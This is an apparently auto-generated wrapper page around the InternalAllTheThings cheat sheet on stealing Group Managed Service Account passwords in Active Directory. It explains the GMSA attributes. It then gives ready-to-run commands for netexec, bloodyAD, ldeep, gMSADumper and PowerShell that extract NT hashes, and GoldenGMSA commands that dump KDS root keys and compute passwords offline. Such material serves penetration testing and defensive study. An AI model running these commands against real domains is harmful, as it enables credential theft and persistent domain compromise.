---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Password - GMSA

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-active-directory-pwd-read-gmsa` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/pwd-read-gmsa.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Password - GMSA](../../topics/active-directory/password-gmsa.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-active-directory-pwd-read-gmsa |
| name | Password - GMSA |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/active-directory/pwd-read-gmsa.md |

## Preserved Source Material

````yaml
_body: "# Password - GMSA\n\n## Reading GMSA Password\n\n> User accounts created to be used as service accounts rarely have\
  \ their password changed. Group Managed Service Accounts (GMSAs) provide a better approach (starting in the Windows 2012\
  \ timeframe). The password is managed by AD and automatically rotated every 30 days to a randomly generated password of\
  \ 256 bytes.\n\n### GMSA Attributes in the Active Directory\n\n* `msDS-GroupMSAMembership` (`PrincipalsAllowedToRetrieveManagedPassword`)\
  \ - stores the security principals that can access the GMSA password.\n* `msds-ManagedPassword` - This attribute contains\
  \ a BLOB with password information for group-managed service accounts.\n* `msDS-ManagedPasswordId` - This constructed attribute\
  \ contains the key identifier for the current managed password data for a group MSA.\n* `msDS-ManagedPasswordInterval` -\
  \ This attribute is used to retrieve the number of days before a managed password is automatically changed for a group MSA.\n\
  \n### Extract NT hash from the Active Directory\n\n* [Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)\n\n  ```ps1\n\
  \  netexec ldap 10.10.10.10 -u user -p pass --gmsa\n\n  # Use --lsa to get GMSA ID\n  netexec ldap domain.lab -u user -p\
  \ 'PWD' --gmsa-convert-id 00[...]99\n  netexec ldap domain.lab -u user -p 'PWD' --gmsa-decrypt-lsa '_SC_GMSA_{[...]}_.....'\n\
  \  ```\n\n* [CravateRouge/bloodyAD](https://github.com/CravateRouge/bloodyAD)\n\n  ```ps1\n  bloodyAD --host 10.10.10.10\
  \ -d crash.lab -u john -p 'Pass123*' get search --filter '(ObjectClass=msDS-GroupManagedServiceAccount)' --attr msDS-ManagedPassword\n\
  \  ```\n\n* [franc-pentest/ldeep](https://github.com/franc-pentest/ldeep)\n\n  ```ps1\n  ldeep ldap -s dc1.domain.local\
  \ -u 'username' -p 'P@ssw0rd' -d domain.local gmsa\n  ```\n\n* [rvazarkar/GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)\n\
  \n  ```ps1\n  GMSAPasswordReader.exe --accountname SVC_SERVICE_ACCOUNT\n  ```\n\n* [micahvandeusen/gMSADumper](https://github.com/micahvandeusen/gMSADumper)\n\
  \n   ```powershell\n  python3 gMSADumper.py -u User -p Password1 -d domain.local\n  ```\n  \n* Active Directory Powershell\n\
  \n  ```ps1\n  $gmsa =  Get-ADServiceAccount -Identity 'SVC_SERVICE_ACCOUNT' -Properties 'msDS-ManagedPassword'\n  $blob\
  \ = $gmsa.'msDS-ManagedPassword'\n  $mp = ConvertFrom-ADManagedPasswordBlob $blob\n  $hash1 =  ConvertTo-NTHash -Password\
  \ $mp.SecureCurrentPassword\n  ```\n\n* [kdejoyce/gMSA_Permissions_Collection.ps1](https://gist.github.com/kdejoyce/f0b8f521c426d04740148d72f5ea3f6f#file-gmsa_permissions_collection-ps1)\
  \ based on Active Directory PowerShell module\n\n## Forging Golden GMSA\n\n> One notable difference between a **Golden Ticket**\
  \ attack and the **Golden GMSA** attack is that they no way of rotating the KDS root key secret. Therefore, if a KDS root\
  \ key is compromised, there is no way to protect the gMSAs associated with it.\n\n:warning: You can't \"force reset\" a\
  \ gMSA password, because a gMSA's password never changes. The password is derived from the KDS root key and `ManagedPasswordIntervalInDays`,\
  \ so every Domain Controller can at any time compute what the password is, what it used to be, and what it will be at any\
  \ point in the future.\n\n* Using [GoldenGMSA](https://github.com/Semperis/GoldenGMSA)\n\n    ```ps1\n    # Enumerate all\
  \ gMSAs\n    GoldenGMSA.exe gmsainfo\n    # Query for a specific gMSA\n    GoldenGMSA.exe gmsainfo --sid S-1-5-21-1437000690-1664695696-1586295871-1112\n\
  \n    # Dump all KDS Root Keys\n    GoldenGMSA.exe kdsinfo\n    # Dump a specific KDS Root Key\n    GoldenGMSA.exe kdsinfo\
  \ --guid 46e5b8b9-ca57-01e6-e8b9-fbb267e4adeb\n\n    # Compute gMSA password\n    # --sid <gMSA SID>: SID of the gMSA (required)\n\
  \    # --kdskey <Base64-encoded blob>: Base64 encoded KDS Root Key\n    # --pwdid <Base64-encoded blob>: Base64 of msds-ManagedPasswordID\
  \ attribute value\n    GoldenGMSA.exe compute --sid S-1-5-21-1437000690-1664695696-1586295871-1112 # requires privileged\
  \ access to the domain\n    GoldenGMSA.exe compute --sid S-1-5-21-1437000690-1664695696-1586295871-1112 --kdskey AQAAALm45UZXyuYB[...]G2/M=\
  \ # requires LDAP access\n    GoldenGMSA.exe compute --sid S-1-5-21-1437000690-1664695696-1586295871-1112 --kdskey AQAAALm45U[...]SM0R7djG2/M=\
  \ --pwdid AQAAA[..]AAA # Offline mode\n    ```\n\n## References\n\n* [Introducing the Golden GMSA Attack - YUVAL GORDON\
  \ - March 01, 2022](https://www.semperis.com/blog/golden-gmsa-attack/)\n* [Hunt for the gMSA secrets - Dr Nestori Syynimaa\
  \ (@DrAzureAD) - August 29, 2022](https://aadinternals.com/post/gmsa/)\n* [Practical guide for Golden SAML - Practical guide\
  \ step by step to create golden SAML](https://nodauf.dev/p/practical-guide-for-golden-saml/)"
_relative_path: active-directory/pwd-read-gmsa.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/pwd-read-gmsa.md
````
